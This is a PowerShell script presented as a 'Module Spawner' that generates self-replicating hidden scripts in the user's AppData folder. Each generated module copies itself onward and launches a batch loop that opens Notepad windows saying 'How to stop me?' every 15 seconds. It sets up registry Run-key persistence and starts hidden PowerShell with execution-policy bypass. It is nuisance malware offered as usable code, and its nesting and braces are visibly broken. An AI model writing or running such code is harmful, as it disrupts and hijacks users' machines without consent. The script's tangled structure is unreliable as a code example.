$ModuleSpawner = @{
    Name = "Module Spawner"
    Width = 360
    Height = 80
    Actions = @{
        Enable = {
            try {
                # Define the module template as a string
                $moduleTemplate = @'
$Module{0} = @{
    Name = "Generated Module {0}"
    Width = 360
    Height = 80
    Actions = @{
        Enable = {
            try {
                # Create the directory for modules in AppData
                $modulesPath = "$env:APPDATA\Modules"
                if (-not (Test-Path $modulesPath)) {
                    New-Item -ItemType Directory -Path $modulesPath -Force | Out-Null
                }

                # Generate the path for the next module
                $nextModulePath = Join-Path $modulesPath "Module{1}.ps1"

                # Get the content of the current module and prepare the next one
                $thisContent = Get-Content "$modulesPath\Module{0}.ps1" -Raw
                $thisContent -f {1}, {3}, {0} | Out-File $nextModulePath -Force

                # Create a spam script to run notepad instances
                $spamScriptPath = Join-Path $modulesPath "spam{0}.bat"
                @'
:loop
@echo How to stop me? > "%temp%\spam{0}.txt"
start /min notepad "%temp%\spam{0}.txt"
timeout /t 15 /nobreak > nul
goto loop
'@ -f {0} | Out-File $spamScriptPath -Force -Encoding ASCII

                # Add the spam script to the registry for persistence
                $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
                $regValue = "cmd /c `"$spamScriptPath`""
                Set-ItemProperty -Path $regPath -Name "ModuleSpam{0}" -Value $regValue -Force

                # Start the spam script hidden
                Start-Process $spamScriptPath -WindowStyle Hidden

                # Start the next module
                Start-Process PowerShell -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -File `"$nextModulePath`""

                Write-Host "Created and started Module{1}"
                return $true
            } catch {
                Write-Host "Error enabling Module{0}: $_"
                return $false
            }
        }
        Disable = {
            try {
                # Stop related processes (notepad, spam scripts)
                Get-Process | Where-Object {
                    $_.ProcessName -eq "notepad" -or
                    ($_.ProcessName -eq "cmd" -and $_.CommandLine -match "spam")
                } | Stop-Process -Force -ErrorAction SilentlyContinue

                # Remove module files
                $modulesPath = "$env:APPDATA\Modules"
                if (Test-Path $modulesPath) {
                    Remove-Item -Path $modulesPath -Recurse -Force
                }

                # Remove registry entries
                $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
                Get-Item $regPath | Get-ItemProperty |
                    Where-Object { $_.PSChildName -match "ModuleSpam" } |
                    ForEach-Object {
                        Remove-ItemProperty -Path $regPath -Name $_.PSChildName -ErrorAction SilentlyContinue
                    }

                # Clean up temp files
                Get-ChildItem "$env:TEMP\spam*.txt" -ErrorAction SilentlyContinue | Remove-Item -Force

                Write-Host "Cleaned up Module {0}"
                return $true
            } catch {
                Write-Host "Error disabling Module{0}: $_"
                return $false
            }
        }
    }
}

# Build the dynamic variable name
$moduleVariableName = "Module{0}" -f $firstModuleNum

# Dynamically invoke the Enable action
Invoke-Expression "$($moduleVariableName).Actions.Enable.Invoke()"

# Return the dynamically generated module
return (Get-Variable -Name $moduleVariableName -ValueOnly)

'@

# Create the modules directory if it doesn exist'

$modulesPath = "$env:APPDATA\Modules"
if (-not (Test-Path $modulesPath)) {
    New-Item -ItemType Directory -Path $modulesPath -Force | Out-Null
}


                # Generate module numbers
                $firstModuleNum = Get-Random -Minimum 1000 -Maximum 9999
                $secondModuleNum = Get-Random -Minimum 1000 -Maximum 9999

                # Generate the path for the first module
                $firstModulePath = Join-Path $modulesPath "Module$firstModuleNum.ps1"

                # Create the first module using the template
                $moduleTemplate -f $firstModuleNum, $secondModuleNum, $firstModuleNum, ($secondModuleNum + 1) |
                    Out-File $firstModulePath -Force

                    try {
                        # Generate the first module file
                        $moduleTemplate -f $firstModuleNum, $secondModuleNum, $firstModuleNum, ($secondModuleNum + 1) |
                            Out-File $firstModulePath -Force
                    
                        # Start the first module
                        Start-Process PowerShell -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -File `"$firstModulePath`""
                    
                        Write-Host "Started module chain with notepad spam"
                        return $true
                    } catch {
                Write-Host "Error starting module chain: $_"
                return $false
            }
        
        Disable = {
            try {
                # Stop all processes related to modules
                Get-Process | Where-Object {
                    $_.ProcessName -eq "notepad" -or
                    ($_.ProcessName -eq "cmd" -and $_.CommandLine -match "spam") -or
                    ($_.ProcessName -eq "powershell" -and $_.CommandLine -match "Module")
                } | Stop-Process -Force -ErrorAction SilentlyContinue

                # Remove module files
                $modulesPath = "$env:APPDATA\Modules"
                if (Test-Path $modulesPath) {
                    Remove-Item -Path $modulesPath -Recurse -Force
                }

                # Remove registry entries
                $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
                Get-Item $regPath | Get-ItemProperty |
                    Where-Object { $_.PSChildName -match "ModuleSpam" } |
                    ForEach-Object {
                        Remove-ItemProperty -Path $regPath -Name $_.PSChildName -ErrorAction SilentlyContinue
                    }

                # Clean up temp files
                Get-ChildItem "$env:TEMP\spam*.txt" -ErrorAction SilentlyContinue | Remove-Item -Force

                Write-Host "Cleaned up all modules and spam processes"
                return $true
            } catch {
                Write-Host "Error cleaning up: $_"
                return $false
            }
        }


return $ModuleSpawner
